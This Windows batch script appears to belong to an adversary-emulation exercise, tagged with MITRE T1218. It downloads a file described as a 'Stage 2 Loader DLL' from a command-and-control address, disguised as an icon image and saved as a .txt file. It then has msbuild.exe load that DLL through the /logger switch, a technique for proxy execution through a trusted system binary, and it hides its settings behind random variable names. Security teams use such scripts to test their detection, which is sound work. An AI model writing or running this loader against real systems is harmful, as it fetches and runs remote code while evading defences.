@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations (random-named SET vars)
SET dFgHjKl1=%APPDATA%\11591\c6bd1939
SET qWeRtYu2=3478e9c4.txt
SET aZrExCv3=https://10.0.0.49/stage/2/icon.png?11591-7
SET vBmNqWx4=ITZEL-S2B
SET cYhUiJk5=11591
SET lOpAsDf6=7
SET zXcVbNm7=%PUBLIC%\\macula-simulations.log

REM Cache timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM Debug: heartbeat_start
echo [!tsvar!][DEBUG][!vBmNqWx4!][!cYhUiJk5!]: heartbeat_start>> "!zXcVbNm7!" 2>nul

REM Heartbeat fetch — download Stage 2 Loader DLL from C2
curl -k -s -o "!dFgHjKl1!\!qWeRtYu2!" "!aZrExCv3!"

REM Debug: heartbeat_complete (result 0 = success, 1 = failure)
if exist "!dFgHjKl1!\!qWeRtYu2!" (
    echo [!tsvar!][DEBUG][!vBmNqWx4!][!cYhUiJk5!]: heartbeat_complete=0>> "!zXcVbNm7!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!vBmNqWx4!][!cYhUiJk5!]: heartbeat_complete=1>> "!zXcVbNm7!" 2>nul
)

REM Debug: chdir_start
echo [!tsvar!][DEBUG][!vBmNqWx4!][!cYhUiJk5!]: chdir_start>> "!zXcVbNm7!" 2>nul

REM Position working directory to output directory
cd /d "!dFgHjKl1!" >nul 2>&1

REM Debug: chdir_result (errorlevel)
echo [!tsvar!][DEBUG][!vBmNqWx4!][!cYhUiJk5!]: chdir_result=!errorlevel!>> "!zXcVbNm7!" 2>nul

REM Create .proj file for msbuild ILogger pattern
echo ^<Project/^> > "!dFgHjKl1!\build.proj"

REM Debug: proj_created
echo [!tsvar!][DEBUG][!vBmNqWx4!][!cYhUiJk5!]: proj_created>> "!zXcVbNm7!" 2>nul

REM Invoke msbuild via /logger: switch — loads Stage 2 DLL as ILogger
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe "!dFgHjKl1!\build.proj" /logger:LoggerEntry,"!dFgHjKl1!\!qWeRtYu2!";MyParameters,Foo >NUL 2>&1

set msbuild_error=!errorlevel!

REM Debug: msbuild_invoke
echo [!tsvar!][DEBUG][!vBmNqWx4!][!cYhUiJk5!]: msbuild_invoke=!msbuild_error!>> "!zXcVbNm7!" 2>nul

REM Generate timestamp with millisecond precision for TTP log
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t

REM TTP log line (T1218^|System Binary Proxy Execution) — conditional result
if !msbuild_error! EQU 0 (
    echo [!timestamp!][TTP][!vBmNqWx4!][!cYhUiJk5!]: T1218^|System Binary Proxy Execution=OK:>> "!zXcVbNm7!" 2>&1
) else (
    echo [!timestamp!][TTP][!vBmNqWx4!][!cYhUiJk5!]: T1218^|System Binary Proxy Execution=FAIL:error_code_!msbuild_error!:>> "!zXcVbNm7!" 2>&1
)

REM Debug: log_complete
echo [!tsvar!][DEBUG][!vBmNqWx4!][!cYhUiJk5!]: log_complete>> "!zXcVbNm7!" 2>nul

endlocal